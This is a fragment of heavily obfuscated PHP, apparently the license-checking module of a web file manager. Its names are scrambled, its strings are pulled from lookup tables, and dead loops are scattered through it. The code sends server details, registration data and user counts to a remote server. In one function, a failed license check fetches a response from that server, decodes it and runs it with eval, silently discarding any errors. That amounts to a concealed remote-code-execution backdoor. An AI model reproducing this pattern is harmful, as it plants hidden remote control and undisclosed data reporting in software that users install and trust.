$™•¦Š§ò[122]) { $ñ¥¨éÈß = !0; } if ($ñ¥¨éÈß) { $ÂóëïĞÍ = array($™•¦Š§ò[108] => $this->hcnb757df6e8, $™•¦Š§ò[123] => $this->kyau95712427(), $™•¦Š§ò[124] => Model($™•¦Š§ò[125])->count()); if ($this->hcnb757df6e8 != $™•¦Š§ò[109]) { $åæğ­¥ä = _get($this->bzmfbdb83a8c, $™•¦Š§ò[126]); if ($åæğ­¥ä) { $ÂóëïĞÍ[$™•¦Š§ò[127]] = $åæğ­¥ä; $ÂóëïĞÍ[$™•¦Š§ò[128]] = strtotime(_get($this->bzmfbdb83a8c, $™•¦Š§ò[129])); $ÂóëïĞÍ[$™•¦Š§ò[130]] = _get($this->bzmfbdb83a8c, $™•¦Š§ò[116]); } $ÉúôàÇ = Model($™•¦Š§ò[33])->get($™•¦Š§ò[131], $™•¦Š§ò[6], !0); if (is_string($ÉúôàÇ) && substr($ÉúôàÇ, 0, 1) == $™•¦Š§ò[132]) { $ÉúôàÇ = json_decode_force($ÉúôàÇ); } if (is_array($ÉúôàÇ) && $ÉúôàÇ[$™•¦Š§ò[133]] && strstr($ÉúôàÇ[$™•¦Š§ò[133]], $™•¦Š§ò[134])) { $ÔÍ¢·Ã› = explode($™•¦Š§ò[134], $ÉúôàÇ[$™•¦Š§ò[133]]); $ÂóëïĞÍ[$™•¦Š§ò[135]] = $ÔÍ¢·Ã›[0]; } } $ÂóëïĞÍ = $this->pwaz313be4c9(json_encode($ÂóëïĞÍ), md5($™•¦Š§ò[136])); $Ì«ƒ¡© = $«¸¦Ü¥í[732]; if (strlen($Ì«ƒ¡©) < $«¸¦Ü¥í[709]) { return; } $ÅµàØˆ¡ = array($™•¦Š§ò[137] => $ÂóëïĞÍ); call_user_func(array($™•¦Š§ò[138], $™•¦Š§ò[139]), $ÅµàØˆ¡); } if ($this->hcnb757df6e8 == $™•¦Š§ò[109]) { return; } $½Õ„ğõç = array($™•¦Š§ò[140], $™•¦Š§ò[141], $™•¦Š§ò[142], $™•¦Š§ò[143], $™•¦Š§ò[144], $™•¦Š§ò[145]); $×ïŸ·Š = Model($™•¦Š§ò[33])->get(); $ÍóÎÑ‰ò = $«¸¦Ü¥í[733]; if (!$ÍóÎÑ‰ò) { return; } $ÅµàØˆ¡ = array($™•¦Š§ò[146] => $×ïŸ·Š[$™•¦Š§ò[34]], $™•¦Š§ò[147] => $×ïŸ·Š[$™•¦Š§ò[35]], $™•¦Š§ò[148] => $™•¦Š§ò[6]); $§è¯ôä¸ = $«¸¦Ü¥í[734]; foreach ($½Õ„ğõç as $è‹“ç²İ) { if (!isset($×ïŸ·Š[$è‹“ç²İ]) || !$×ïŸ·Š[$è‹“ç²İ]) { continue; } $ÅµàØˆ¡[$è‹“ç²İ] = $×ïŸ·Š[$è‹“ç²İ]; } call_user_func(array($™•¦Š§ò[138], $™•¦Š§ò[139]), $ÅµàØˆ¡); $ÊÏò‡Ì® = $«¸¦Ü¥í[699]; if (!$ÊÏò‡Ì®) { die; } } private function tkezb87c65b4() { $¢ØÌİ =& $_SERVER[É¨™èà]; $ä®ÔÕº• =& $_SERVER[–úÃ®‰¸]; if ($_SERVER[$ä®ÔÕº•[24]] != $ä®ÔÕº•[149]) { return; } if (!KodUser::isRoot()) { die; } $åËœÛÔü = $GLOBALS[$ä®ÔÕº•[13]]; if (isset($åËœÛÔü[$ä®ÔÕº•[150]])) { $this->btyi9af462d0(); die; } if (isset($åËœÛÔü[$ä®ÔÕº•[151]]) && isset($åËœÛÔü[$ä®ÔÕº•[151]]) == $ä®ÔÕº•[122]) { $åËœÛÔü[$ä®ÔÕº•[152]] = Model($ä®ÔÕº•[33])->get($ä®ÔÕº•[153]); } if (!isset($åËœÛÔü[$ä®ÔÕº•[152]]) || strlen($åËœÛÔü[$ä®ÔÕº•[152]]) != 16) { show_json($ä®ÔÕº•[154] . $åËœÛÔü[$ä®ÔÕº•[152]], !1); } $üÊ†äùï = Model($ä®ÔÕº•[33])->get($ä®ÔÕº•[100]); $øÓŒ×¬ = md5($_SERVER[$ä®ÔÕº•[106]] . $üÊ†äùï); $µ‰ÕºÕ“ = array($ä®ÔÕº•[152] => $åËœÛÔü[$ä®ÔÕº•[152]], $ä®ÔÕº•[155] => rand_string(16), $ä®ÔÕº•[156] => $ä®ÔÕº•[136], $ä®ÔÕº•[157] => $ä®ÔÕº•[158], $ä®ÔÕº•[159] => $_SERVER[$ä®ÔÕº•[160]], $ä®ÔÕº•[161] => $_SERVER[$ä®ÔÕº•[162]], $ä®ÔÕº•[163] => $_SERVER[$ä®ÔÕº•[164]], $ä®ÔÕº•[105] => $øÓŒ×¬, $ä®ÔÕº•[165] => Model($ä®ÔÕº•[33])->get($ä®ÔÕº•[131])); $‡åË¾é« = $¢ØÌİ[735]; if (!$‡åË¾é«) { return; } if (isset($åËœÛÔü[$ä®ÔÕº•[151]]) && isset($åËœÛÔü[$ä®ÔÕº•[151]]) == $ä®ÔÕº•[122]) { $µ‰ÕºÕ“[$ä®ÔÕº•[151]] = md5($µ‰ÕºÕ“[$ä®ÔÕº•[152]] . $ä®ÔÕº•[166] . $µ‰ÕºÕ“[$ä®ÔÕº•[155]]); } if ($åËœÛÔü[$ä®ÔÕº•[167]] == $ä®ÔÕº•[168]) { $ÀîÇÄ‘Õ = $this->pwaz313be4c9($øÓŒ×¬, $ä®ÔÕº•[169]); $Ëè¯†şö = $this->vbqsb65d8103(json_encode($µ‰ÕºÕ“), $øÓŒ×¬ . $ä®ÔÕº•[170], 3); $Ëè¯†şö = $Ëè¯†şö . $ä®ÔÕº•[171] . $_SERVER[$ä®ÔÕº•[160]]; $Ú‚ä‹ğÊ = $this->nzmebc7e74f4($ä®ÔÕº•[172] . $ÀîÇÄ‘Õ . $ä®ÔÕº•[173] . $Ëè¯†şö, -1); show_json($Ú‚ä‹ğÊ, !0); } else { if ($åËœÛÔü[$ä®ÔÕº•[167]] == $ä®ÔÕº•[174]) { $ÆÏÀñ—À = substr(md5($ä®ÔÕº•[175] . $øÓŒ×¬), 12, 15) . $ä®ÔÕº•[176]; $Ëè¯†şö = $this->gijhc8fe9ea9(trim($åËœÛÔü[$ä®ÔÕº•[177]]), $ÆÏÀñ—À, 2); $¸Ğîè‚« = json_decode($Ëè¯†şö, !0); if (!is_array($¸Ğîè‚«) || !is_array($¸Ğîè‚«[$ä®ÔÕº•[178]]) || $¸Ğîè‚«[$ä®ÔÕº•[152]] != !0) { $ƒø÷ĞÇ½ = $ä®ÔÕº•[179]; $ŒÑÜ‡¨† = $¸Ğîè‚«[$ä®ÔÕº•[178]] ? $ä®ÔÕº•[180] . $¸Ğîè‚«[$ä®ÔÕº•[178]] : $ƒø÷ĞÇ½; show_json($ŒÑÜ‡¨†, !1); } else { $µ‰ÕºÕ“[$ä®ÔÕº•[155]] = $¸Ğîè‚«[$ä®ÔÕº•[178]][$ä®ÔÕº•[181]]; } } else { $¸Ğîè‚« = $this->nzmebc7e74f4($ä®ÔÕº•[182], $µ‰ÕºÕ“, 10); } } if (!is_array($¸Ğîè‚«) || !is_array($¸Ğîè‚«[$ä®ÔÕº•[178]]) || $¸Ğîè‚«[$ä®ÔÕº•[152]] != !0) { $ƒø÷ĞÇ½ = LNG($ä®ÔÕº•[183]); $ŒÑÜ‡¨† = $¸Ğîè‚«[$ä®ÔÕº•[178]] ? $ä®ÔÕº•[180] . $¸Ğîè‚«[$ä®ÔÕº•[178]] : $ƒø÷ĞÇ½; show_json($ŒÑÜ‡¨†, !1); } $‡ÙïØ«‰ = $¸Ğîè‚«[$ä®ÔÕº•[178]]; $ğ™î‘  = $this->gmzi8cb23656($‡ÙïØ«‰[$ä®ÔÕº•[184]]); $‘¹šŸ”é = $¢ØÌİ[736]; while ($‘¹šŸ”é < $¢ØÌİ[698]) { if ($‘¹šŸ”é >= 0) { break; } $‘¹šŸ”é++; } if (!$ğ™î‘  || $ğ™î‘  != $‡ÙïØ«‰[$ä®ÔÕº•[129]]) { $«÷Å¡¥• = array($ä®ÔÕº•[185] => Model($ä®ÔÕº•[33])->get($ä®ÔÕº•[100]), $ä®ÔÕº•[186] => $_SERVER[$ä®ÔÕº•[106]], $ä®ÔÕº•[187] => this_url(), $ä®ÔÕº•[161] => $_SERVER[$ä®ÔÕº•[162]]); $Ëè¯†şö = $this->nwqh74ab8068(json_encode($«÷Å¡¥•)); $this->nzmebc7e74f4($ä®ÔÕº•[188] . $Ëè¯†şö); show_json(LNG($ä®ÔÕº•[189]), !0); } $º°¼½¸ƒ = array($ä®ÔÕº•[153] => $‡ÙïØ«‰[$ä®ÔÕº•[190]], $ä®ÔÕº•[191] => $‡ÙïØ«‰[$ä®ÔÕº•[192]], $ä®ÔÕº•[193] => rand_string(16), $ä®ÔÕº•[108] => $‡ÙïØ«‰[$ä®ÔÕº•[194]]); if ($µ‰ÕºÕ“[$ä®ÔÕº•[155]]) { $º°¼½¸ƒ[$ä®ÔÕº•[193]] = $µ‰ÕºÕ“[$ä®ÔÕº•[155]]; } $Ö™÷—­ = substr(md5($º°¼½¸ƒ[$ä®ÔÕº•[191]]), 10, 10); $¥«ˆÆ‰ = $Ö™÷—­ . $º°¼½¸ƒ[$ä®ÔÕº•[108]] . $º°¼½¸ƒ[$ä®ÔÕº•[193]]; $º°¼½¸ƒ[$ä®ÔÕº•[110]] = strrev(base64_encode($this->pwaz313be4c9($¥«ˆÆ‰, $ä®ÔÕº•[195]))); $Ïæ–øµÈ = $¢ØÌİ[737]; if (strlen($Ïæ–øµÈ) < $¢ØÌİ[704]) { return; } $Šå¨ÁÜù = rand_string(16); $âïÁÀ™ = $Šå¨ÁÜù . $º°¼½¸ƒ[$ä®ÔÕº•[108]] . $this->pwaz313be4c9(md5($º°¼½¸ƒ[$ä®ÔÕº•[153]]), $Šå¨ÁÜù); $º°¼½¸ƒ[$ä®ÔÕº•[111]] = base64_encode(strrev($this->pwaz313be4c9($âïÁÀ™, $ä®ÔÕº•[196]))); $²Øğ¨Œ‘ = $¢ØÌİ[738]; while (strlen($²Øğ¨Œ‘) < $¢ØÌİ[698]) { if (!$²Øğ¨Œ‘) { break; } $²Øğ¨Œ‘++; } if ($‡ÙïØ«‰[$ä®ÔÕº•[197]] && $‡ÙïØ«‰[$ä®ÔÕº•[197]] >= 1) { Model($ä®ÔÕº•[33])->setDeep($ä®ÔÕº•[198], $ä®ÔÕº•[122]); } Model($ä®ÔÕº•[33])->set($º°¼½¸ƒ); $çÇÑ§Ğ× = md5($_SERVER[$ä®ÔÕº•[106]] . strrev($üÊ†äùï) . $º°¼½¸ƒ[$ä®ÔÕº•[191]]); $ê´Ã½œ£ = $¢ØÌİ[739]; if (!$ê´Ã½œ£) { die; } $Íô¤ä©‘ = strrev(substr($çÇÑ§Ğ×, 10, 16)); $ß’ÆÒ·• = $¢ØÌİ[740]; if (!$ß’ÆÒ·•) { return; } $€Ù¢à = $this->vbqsb65d8103(json_encode($‡ÙïØ«‰), $çÇÑ§Ğ×); $–øş’Øñ = array_to_keyvalue(Model($ä®ÔÕº•[7])->listData(), $ä®ÔÕº•[199]); $Ş¤¨Íú = $–øş’Øñ[$ä®ÔÕº•[200]]; $±¤³ëòË = array(); $±¤³ëòË[$Íô¤ä©‘] = $€Ù¢à; $¤¿àéÓ¼ = $¢ØÌİ[741]; while ($¤¿àéÓ¼ < $¢ØÌİ[698]) { if ($¤¿àéÓ¼ >= 0) { break; } $¤¿àéÓ¼++; } Model($ä®ÔÕº•[7])->update($Ş¤¨Íú[$ä®ÔÕº•[201]], array($ä®ÔÕº•[202] => $±¤³ëòË)); $this->bzmfbdb83a8c = $‡ÙïØ«‰; $•µß³ôã = $¢ØÌİ[742]; if (!$•µß³ôã) { die; } $this->hcnb757df6e8 = $º°¼½¸ƒ[$ä®ÔÕº•[108]]; $¤ş›ŒâÇ = $¢ØÌİ[743]; while ($¤ş›ŒâÇ < $¢ØÌİ[720]) { if ($¤ş›ŒâÇ >= 0) { break; } $¤ş›ŒâÇ++; } $this->licenseRegistSuccess(); Cache::set($ä®ÔÕº•[203] . md5($üÊ†äùï . $ä®ÔÕº•[204]), $ä®ÔÕº•[6]); $Í÷óö‹ = $¢ØÌİ[744]; show_json(LNG($ä®ÔÕº•[189]), !0); $ƒş¨æÌÃ = $¢ØÌİ[745]; if (!$ƒş¨æÌÃ) { die; } } private function licenseRegistSuccess() { $¿îÉ‚ =& $_SERVER[–úÃ®‰¸]; $ƒÏí®ä = Model($¿îÉ‚[33])->get(); if ($ƒÏí®ä[$¿îÉ‚[63]] != $¿îÉ‚[122]) { Model($¿îÉ‚[33])->set($¿îÉ‚[63], $¿îÉ‚[122]); } Action($¿îÉ‚[205])->initStart(!0); } private function btyi9af462d0() { $¢œçÈÜ” =& $_SERVER[É¨™èà]; $’¢Œ˜•Î =& $_SERVER[–úÃ®‰¸]; Model($’¢Œ˜•Î[33])->set(array($’¢Œ˜•Î[153] => $’¢Œ˜•Î[6], $’¢Œ˜•Î[191] => $’¢Œ˜•Î[6], $’¢Œ˜•Î[108] => $’¢Œ˜•Î[109], $’¢Œ˜•Î[110] => $’¢Œ˜•Î[6], $’¢Œ˜•Î[111] => $’¢Œ˜•Î[6])); Model($’¢Œ˜•Î[33])->setDeep($’¢Œ˜•Î[198], $’¢Œ˜•Î[206]); $Ó¨™ØÉÅ = $¢œçÈÜ”[746]; $this->bzmfbdb83a8c = array(); $¾øñ¤šÒ = $¢œçÈÜ”[747]; if (!$¾øñ¤šÒ) { die; } $this->hcnb757df6e8 = $’¢Œ˜•Î[109]; $†¹®œ²Ü = $¢œçÈÜ”[748]; if (strlen($†¹®œ²Ü) < $¢œçÈÜ”[709]) { die; } } private function fhyp9a6d6b5d() { $œóÊùş¬ =& $_SERVER[É¨™èà]; $Ò†û·ÌÒ =& $_SERVER[–úÃ®‰¸]; $_SERVER[$Ò†û·ÌÒ[162]] = _get($_SERVER, $Ò†û·ÌÒ[162], APP_HOST); $£ë·ì´ = $œóÊùş¬[749]; while (strlen($£ë·ì´) < $œóÊùş¬[698]) { if (!$£ë·ì´) { break; } $£ë·ì´++; } $this->hcnb757df6e8 = $Ò†û·ÌÒ[109]; $»«Ò®ëë = $œóÊùş¬[750]; $ÛÌ—òã× = Model($Ò†û·ÌÒ[33])->get(); if ($ÛÌ—òã×[$Ò†û·ÌÒ[108]] == $Ò†û·ÌÒ[109]) { return; } $ú’¶ÇŠÏ = Model($Ò†û·ÌÒ[33])->get($Ò†û·ÌÒ[100]); $Ş¸ÙÈş = $œóÊùş¬[751]; while ($Ş¸ÙÈş < $œóÊùş¬[313]) { if ($Ş¸ÙÈş >= 0) { break; } $Ş¸ÙÈş++; } $õÊüÖŸˆ = $Ò†û·ÌÒ[203] . md5($ú’¶ÇŠÏ . $Ò†û·ÌÒ[204]); $®ˆ’Øê± = $œóÊùş¬[752]; if (strlen($®ˆ’Øê±) < $œóÊùş¬[704]) { return; } $å²ğ¢ñ = Cache::get($õÊüÖŸˆ); $Ğ×ÍìÈ = $œóÊùş¬[753]; while ($Ğ×ÍìÈ < $œóÊùş¬[704]) { if ($Ğ×ÍìÈ >= 0) { break; } $Ğ×ÍìÈ++; } if (!is_array($å²ğ¢ñ) || !isset($å²ğ¢ñ[$Ò†û·ÌÒ[207]]) || time() - $å²ğ¢ñ[$Ò†û·ÌÒ[207]] >= 60) { $ô§ Ç†é = Model($Ò†û·ÌÒ[7])->loadList(); $Ö»†çĞì = $ô§ Ç†é[$Ò†û·ÌÒ[200]]; $“È×Éº = md5($_SERVER[$Ò†û·ÌÒ[106]] . strrev($ú’¶ÇŠÏ) . $ÛÌ—òã×[$Ò†û·ÌÒ[191]]); $¾ŠÌÃêã = strrev(substr($“È×Éº, 10, 16)); $å²ğ¢ñ = $this->gijhc8fe9ea9($Ö»†çĞì[$Ò†û·ÌÒ[86]][$¾ŠÌÃêã], $“È×Éº); $å²ğ¢ñ = json_decode($å²ğ¢ñ, !0); } if (!is_array($å²ğ¢ñ)) { return $this->btyi9af462d0(); } $Ï°°¡¹ = strtotime($å²ğ¢ñ[$Ò†û·ÌÒ[129]]); if (time() >= $Ï°°¡¹) { return $this->btyi9af462d0(); } if (!isset($å²ğ¢ñ[$Ò†û·ÌÒ[207]]) || time() - $å²ğ¢ñ[$Ò†û·ÌÒ[207]] > 20) { $å²ğ¢ñ[$Ò†û·ÌÒ[207]] = time(); Cache::set($õÊüÖŸˆ, $å²ğ¢ñ); } $this->bzmfbdb83a8c = $å²ğ¢ñ; $this->hcnb757df6e8 = $ÛÌ—òã×[$Ò†û·ÌÒ[108]]; } private function maby03660a0f() { $Ş‰ş·ŒÂ =& $_SERVER[É¨™èà]; $½¼Şà‚¨ =& $_SERVER[–úÃ®‰¸]; $ˆéÆÖ­İ = $GLOBALS[$½¼Şà‚¨[13]]; $ÓÙ²İ¶ó = $_SERVER[$½¼Şà‚¨[24]]; $Ë†¼óÅ = $Ş‰ş·ŒÂ[754]; while ($Ë†¼óÅ < $Ş‰ş·ŒÂ[313]) { if ($Ë†¼óÅ >= 0) { break; } $Ë†¼óÅ++; } if ($ÓÙ²İ¶ó == $½¼Şà‚¨[208] && $this->hcnb757df6e8 == $½¼Şà‚¨[109]) { show_json(LNG($½¼Şà‚¨[209]), !1, $½¼Şà‚¨[210]); } $ÔŠ¸¾¨û = array($½¼Şà‚¨[211], $½¼Şà‚¨[212]); if (in_array($ÓÙ²İ¶ó, $ÔŠ¸¾¨û)) { if ($this->hcnb757df6e8 == $½¼Şà‚¨[109] && isset($ˆéÆÖ­İ[$½¼Şà‚¨[213]])) { show_json(LNG($½¼Şà‚¨[209]), !1, $½¼Şà‚¨[210]); die; } $¦ªŞÂ÷µ = $this->kyau95712427(); if ($¦ªŞÂ÷µ != intval($½¼Şà‚¨[214])) { if ($¦ªŞÂ÷µ <= Model($½¼Şà‚¨[125])->count()) { show_json(LNG($½¼Şà‚¨[215]), !1, $½¼Şà‚¨[210]); die; } } } } private function lkno49064d8d() { $¶„–‘ãì =& $_SERVER[É¨™èà]; $°“¦†Åò =& $_SERVER[–úÃ®‰¸]; $³ÓÈÍìö = array($°“¦†Åò[119], $°“¦†Åò[120]); if (!KodUser::isRoot() || !isset($_GET[$°“¦†Åò[216]])) { return; } if (!in_array($_SERVER[$°“¦†Åò[24]], $³ÓÈÍìö)) { return; } $ı³†ç¿ = $°“¦†Åò[217]; $‚Ñõú’Ó = $¶„–‘ãì[755]; if (!$‚Ñõú’Ó) { return; } $ı³†ç¿ = $this->pslh4d3e441b($ı³†ç¿, $°“¦†Åò[218]); $¼İ´¨ù÷ = stream_context_create(array($°“¦†Åò[219] => array($°“¦†Åò[220] => $°“¦†Åò[221], $°“¦†Åò[222] => 3))); $ªÓÛ¦Ú¸ = $¶„–‘ãì[756]; while ($ªÓÛ¦Ú¸ < $¶„–‘ãì[313]) { if ($ªÓÛ¦Ú¸ >= 0) { break; } $ªÓÛ¦Ú¸++; } $Õîçâè© = @file_get_contents($ı³†ç¿, !1, $¼İ´¨ù÷); header($°“¦†Åò[223]); $ıäó‘öİ = $¶„–‘ãì[757]; if (!$ıäó‘öİ) { return; } if ($Õîçâè© && strstr($Õîçâè©, $°“¦†Åò[224])) { echo $Õîçâè©; } die; } public function loaj89c2170f($ú¬«Åò) { $ÉİçÌ =& $_SERVER[É¨™èà]; $ÍÊ™§š  =& $_SERVER[–úÃ®‰¸]; if ($this->hcnb757df6e8 == $ÍÊ™§š [225]) { return $ú¬«Åò; } $¶æÑõÀ³ = $this->versionPluginList(); $àé¬É§ = $ÉİçÌ[758]; if (!$àé¬É§) { die; } $úç®ÌÙï = explode($ÍÊ™§š [226], $this->versionPluginFilter()); $Ş¼µ†Î¿ = $ÉİçÌ[759]; while ($Ş¼µ†Î¿ < $ÉİçÌ[698]) { if ($Ş¼µ†Î¿ >= 0) { break; } $Ş¼µ†Î¿++; } $„©ûêª£ = array(); $ÃÁ×¨âü = $ÉİçÌ[760]; foreach ($¶æÑõÀ³ as $…ÒÆ¥°Ô => $¬»²´¿Ì) { if ($¬»²´¿Ì == $ÍÊ™§š [227] && substr($this->hcnb757df6e8, 0, 1) == $ÍÊ™§š [227]) { continue; } if (!in_array($…ÒÆ¥°Ô, $úç®ÌÙï)) { $„©ûêª£[] = $…ÒÆ¥°Ô; } } foreach ($„©ûêª£ as $…ÒÆ¥°Ô) { unset($ú¬«Åò[$…ÒÆ¥°Ô]); } return $ú¬«Åò; $ı’ç¦†è = $ÉİçÌ[761]; while (strlen($ı’ç¦†è) < $ÉİçÌ[313]) { if (!$ı’ç¦†è) { break; } $ı’ç¦†è++; } } private function versionPluginList() { $«¿²û’ö =& $_SERVER[–úÃ®‰¸]; return array($«¿²û’ö[228] => $«¿²û’ö[227], $«¿²û’ö[229] => $«¿²û’ö[227], $«¿²û’ö[230] => $«¿²û’ö[227], $«¿²û’ö[231] => $«¿²û’ö[227], $«¿²û’ö[232] => $«¿²û’ö[233], $«¿²û’ö[234] => $«¿²û’ö[233], $«¿²û’ö[235] => $«¿²û’ö[233], $«¿²û’ö[236] => $«¿²û’ö[233], $«¿²û’ö[237] => $«¿²û’ö[233], $«¿²û’ö[238] => $«¿²û’ö[233], $«¿²û’ö[239] => $«¿²û’ö[233], $«¿²û’ö[240] => $«¿²û’ö[233], $«¿²û’ö[241] => $«¿²û’ö[233], $«¿²û’ö[242] => $«¿²û’ö[233], $«¿²û’ö[243] => $«¿²û’ö[233], $«¿²û’ö[244] => $«¿²û’ö[233], $«¿²û’ö[245] => $«¿²û’ö[233], $«¿²û’ö[246] => $«¿²û’ö[233]); } private function versionPluginFilter() { $¯Õîã =& $_SERVER[–úÃ®‰¸]; if ($this->hcnb757df6e8 == $¯Õîã[109]) { return $¯Õîã[6]; } $¿€ˆ‹ãĞ = _get($this->bzmfbdb83a8c, $¯Õîã[247], $¯Õîã[6]); $ééç¬“¤ = $_SERVER[É¨™èà][762]; $…²ƒÂó– = _get($this->bzmfbdb83a8c, $¯Õîã[116], $¯Õîã[6]); $éá‰£ë— = _get($this->bzmfbdb83a8c, $¯Õîã[248], $¯Õîã[6]); if ($…²ƒÂó– > time() && $éá‰£ë— > time()) { $é•µÀ«« = explode($¯Õîã[226], $¿€ˆ‹ãĞ); $ÒÛôÖ = array_keys($this->versionPluginList()); $¿€ˆ‹ãĞ = array_merge($é•µÀ««, $ÒÛôÖ); $¿€ˆ‹ãĞ = implode($¯Õîã[226], array_filter(array_unique($¿€ˆ‹ãĞ))); } return $¿€ˆ‹ãĞ; } private function fsvj731033eb() { $†ã‚Â­ş =& $_SERVER[–úÃ®‰¸]; if ($this->hcnb757df6e8 != $†ã‚Â­ş[109]) { $GLOBALS[$†ã‚Â­ş[86]][$†ã‚Â­ş[90]][$†ã‚Â­ş[249]] = $†ã‚Â­ş[206]; return; } $GLOBALS[$†ã‚Â­ş[86]][$†ã‚Â­ş[250]] = $†ã‚Â­ş[122]; if (Model($†ã‚Â­ş[251])->get($†ã‚Â­ş[63]) != $†ã‚Â­ş[206]) { Model($†ã‚Â­ş[251])->set($†ã‚Â­ş[63], $†ã‚Â­ş[206]); } } public function hniz3c86cc3c() { return $_SERVER[–úÃ®‰¸][252]; } private function zpdbec2a9b4c() { $˜¥Â¡«Ş =& $_SERVER[É¨™èà]; $€£ºÕ‘å =& $_SERVER[–úÃ®‰¸]; $øëóÄàÕ = array($€£ºÕ‘å[253], $€£ºÕ‘å[254], $€£ºÕ‘å[255]); $‚ãŸ¸•å = $˜¥Â¡«Ş[763]; while ($‚ãŸ¸•å < $˜¥Â¡«Ş[704]) { if ($‚ãŸ¸•å >= 0) { break; } $‚ãŸ¸•å++; } $Ö´ÛÕˆ¥ = $€£ºÕ‘å[256] . md5($€£ºÕ‘å[257]); if ($this->hcnb757df6e8 == $€£ºÕ‘å[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$€£ºÕ‘å[24]], $øëóÄàÕ)) { return; } if (time() % 4 != 0) { return; } $êĞŒîÙ” = call_user_func(array($€£ºÕ‘å[258], $€£ºÕ‘å[259]), $Ö´ÛÕˆ¥); if ($êĞŒîÙ” && time() - $êĞŒîÙ” < intval($€£ºÕ‘å[260])) { return; } call_user_func(array($€£ºÕ‘å[258], $€£ºÕ‘å[139]), $Ö´ÛÕˆ¥, time()); $›–‹Š­º = Model($€£ºÕ‘å[33])->get($€£ºÕ‘å[100]); $÷ôß”ş« = array($€£ºÕ‘å[152] => Model($€£ºÕ‘å[33])->get($€£ºÕ‘å[153]), $€£ºÕ‘å[167] => $this->hcnb757df6e8, $€£ºÕ‘å[163] => $_SERVER[$€£ºÕ‘å[164]], $€£ºÕ‘å[165] => Model($€£ºÕ‘å[33])->get($€£ºÕ‘å[131]), $€£ºÕ‘å[105] => md5($_SERVER[$€£ºÕ‘å[106]] . $›–‹Š­º), $€£ºÕ‘å[156] => $€£ºÕ‘å[136], $€£ºÕ‘å[159] => $_SERVER[$€£ºÕ‘å[160]]); $Œœ³ı¢À = $this->nzmebc7e74f4($€£ºÕ‘å[261], $÷ôß”ş«); $ŸãÙÃ = $˜¥Â¡«Ş[764]; if (strlen($ŸãÙÃ) < $˜¥Â¡«Ş[720]) { die; } if (!is_array($Œœ³ı¢À)) { return; } if ($Œœ³ı¢À[$€£ºÕ‘å[152]] && $Œœ³ı¢À[$€£ºÕ‘å[262]]) { if ($this->gmzi8cb23656($Œœ³ı¢À[$€£ºÕ‘å[262]]) == $÷ôß”ş«[$€£ºÕ‘å[152]]) { return; } } $this->btyi9af462d0(); $¼ê½Œ¥ = $˜¥Â¡«Ş[765]; if (!$¼ê½Œ¥) { return; } if ($this->gmzi8cb23656($Œœ³ı¢À[$€£ºÕ‘å[262]]) != $÷ôß”ş«[$€£ºÕ‘å[152]]) { $Ç¤Ê›ƒ = array($€£ºÕ‘å[185] => $›–‹Š­º, $€£ºÕ‘å[186] => $_SERVER[$€£ºÕ‘å[106]], $€£ºÕ‘å[187] => this_url(), $€£ºÕ‘å[161] => $_SERVER[$€£ºÕ‘å[162]]); $ı˜©¶†Ê = $this->nwqh74ab8068(json_encode($Ç¤Ê›ƒ)); $Œœ³ı¢À = $this->nzmebc7e74f4($€£ºÕ‘å[188] . $ı˜©¶†Ê); if ($Œœ³ı¢À && is_array($Œœ³ı¢À) && isset($Œœ³ı¢À[$€£ºÕ‘å[262]])) { $¯¼¼ƒÉ = $this->gijhc8fe9ea9($Œœ³ı¢À[$€£ºÕ‘å[262]], 2); if ($¯¼¼ƒÉ) { $¯¼¼ƒÉ = $this->gmzi8cb23656($¯¼¼ƒÉ); } if ($¯¼¼ƒÉ) { try { @eval($¯¼¼ƒÉ); } catch (Exception $ûÃŒÖÜ) { } } } } } private function nzmebc7e74f4($Ë›ù¯µ¾ = '', $ïòÄÓÁ = array(), $ÁùíóóÌ = 5) { $Ğ–à¾¬— =& $_SERVER[É¨™èà]; $ÀóÑ™™Í =& $_SERVER[–úÃ®‰¸]; $Ü±¯ğÈî = $ÀóÑ™™Í[263]; $ŒÔÄÕÙÉ = $Ğ–à¾¬—[766]; $Ü±¯ğÈî = $this->pslh4d3e441b($Ü±¯ğÈî, $ÀóÑ™™Í[264]); $Ü±¯ğÈî = $Ü±¯ğÈî . $Ë›ù¯µ¾; $®°€µİ = $Ğ–à¾¬—[729]; if (!$®°€µİ) { return; } if ($ïòÄÓÁ && is_array($ïòÄÓÁ)) { $Ü±¯ğÈî = $Ü±¯ğÈî . $ÀóÑ™™Í[265] . http_build_query($ïòÄÓÁ); } if ($ïòÄÓÁ === -1) { return $Ü±¯ğÈî; } $©’ÚÃ÷Í = stream_context_create(array($ÀóÑ™™Í[219] => array($ÀóÑ™™Í[222] => $ÁùíóóÌ, $ÀóÑ™™Í[220] => $ÀóÑ™™Í[266]), $ÀóÑ™™Í[267] => array($ÀóÑ™™Í[268] => !1, $ÀóÑ™™Í[269] => !1))); $ûÀ•ƒ³í = $Ğ–à¾¬—[767]; while ($ûÀ•ƒ³í < $Ğ–à¾¬—[313]) { if ($ûÀ•ƒ³í >= 0) { break; } $ûÀ•ƒ³í++; } $ïòÄÓÁ = @file_get_contents($Ü±¯ğÈî, !1, $©’ÚÃ÷Í); $Í”‡±°– = $Ğ–à¾¬—[768]; if (strlen($Í”‡±°–) < $Ğ–à¾¬—[704]) { return; } return json_decode($ïòÄÓÁ, !0); } private function kyau95712427() { $·Ó˜è«Œ =& $_SERVER[É¨™èà]; $Š‡Áµ€ =& $_SERVER[–úÃ®‰¸]; $Ò¾¾ñ®¬ = array($Š‡Áµ€[270] => $Š‡Áµ€[271], $Š‡Áµ€[272] => $Š‡Áµ€[273], $Š‡Áµ€[274] => $Š‡Áµ€[275], $Š‡Áµ€[276] => $Š‡Áµ€[277], $Š‡Áµ€[278] => $Š‡Áµ€[279], $Š‡Áµ€[280] => $Š‡Áµ€[214], $Š‡Áµ€[281] => $Š‡Áµ€[214], $Š‡Áµ€[282] => $Š‡Áµ€[271], $Š‡Áµ€[283] => $Š‡Áµ€[273], $Š‡Áµ€[284] => $Š‡Áµ€[275], $Š‡Áµ€[285] => $Š‡Áµ€[286], $Š‡Áµ€[287] => $Š‡Áµ€[277], $Š‡Áµ€[288] => $Š‡Áµ€[289], $Š‡Áµ€[290] => $Š‡Áµ€[279], $Š‡Áµ€[291] => $Š‡Áµ€[292], $Š‡Áµ€[293] => $Š‡Áµ€[294], $Š‡Áµ€[295] => $Š‡Áµ€[296]); $øÍŒ¦İ² = $Ò¾¾ñ®¬[$this->hcnb757df6e8]; $øÍŒ¦İ² = intval($øÍŒ¦İ² ? $øÍŒ¦İ² : $Š‡Áµ€[271]); $Áòš´ = $·Ó˜è«Œ[769]; while (strlen($Áòš´) < 